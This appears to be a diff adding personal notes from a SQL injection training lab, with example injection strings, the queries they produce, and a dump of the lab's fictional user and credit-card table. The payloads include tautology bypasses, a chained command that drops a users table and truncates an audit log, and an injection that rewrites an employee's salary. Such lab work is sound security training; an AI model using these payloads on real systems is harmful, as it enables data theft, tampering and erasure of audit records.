@@ -1,0 +1,58 @@
+
+
+++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++
+
+"SELECT * FROM users WHERE name = 'Smith=11111'";
+
+ 
+Here are some examples of what a hacker could supply to the input field to perform actions on the database that go further than just reading the data of a single user:
+
+    Smith’ OR '1' = '1
+    results in SELECT * FROM users WHERE name = 'Smith' OR TRUE; and that way will return all entries from the users table
+
+    Smith’ OR 1 = 1; --
+    results in SELECT * FROM users WHERE name = 'Smith' OR TRUE;--'; and that way will return all entries from the users table
+
+    Smith’; DROP TABLE users; TRUNCATE audit_log; --
+    chains multiple SQL-Commands and deletes the USERS table as well as entries from the audit_log
+
+
+++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++
+
+Your query was: SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
+
+' 	
+You have succeeded:
+
+USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
+101, Joe, Snow, 987654321, VISA, , 0,
+101, Joe, Snow, 2234200065411, MC, , 0,
+102, John, Smith, 2435600002222, MC, , 0,
+102, John, Smith, 4352209902222, AMEX, , 0,
+103, Jane, Plane, 123456789, MC, , 0,
+103, Jane, Plane, 333498703333, AMEX, , 0,
+10312, Jolly, Hershey, 176896789, MC, , 0,
+10312, Jolly, Hershey, 333300003333, AMEX, , 0,
+10323, Grumpy, youaretheweakestlink, 673834489, MC, , 0,
+10323, Grumpy, youaretheweakestlink, 33413003333, AMEX, , 0,
+15603, Peter, Sand, 123609789, MC, , 0,
+15603, Peter, Sand, 338893453333, AMEX, , 0,
+15613, Joesph, Something, 33843453533, AMEX, , 0,
+15837, Chaos, Monkey, 32849386533, CM, , 0,
+19204, Mr, Goat, 33812953533, VISA, , 0,
+Your query was: SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
+
+++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++
+
+Your query was: SELECT * From user_data WHERE Login_Count = 0 and userid= 0 or true
+
+++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++
+
+'; update employees set salary = 832832383 where last_name = 'Smith' --
+
+++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++
